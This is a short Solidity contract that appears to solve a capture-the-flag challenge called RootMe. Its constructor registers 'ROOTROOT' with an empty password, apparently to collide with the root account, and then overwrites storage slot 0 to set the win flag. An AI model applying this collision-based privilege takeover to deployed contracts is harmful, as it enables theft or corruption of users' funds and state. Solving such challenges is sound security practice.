// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { RootMe } from "eko/ChallengeRootMe.sol";

contract RootMeCracker {
  constructor(RootMe rootMe) {
    rootMe.register("ROOTROOT", "");
    rootMe.write(bytes32(uint256(0)), bytes32(uint256(1)));
  }
}
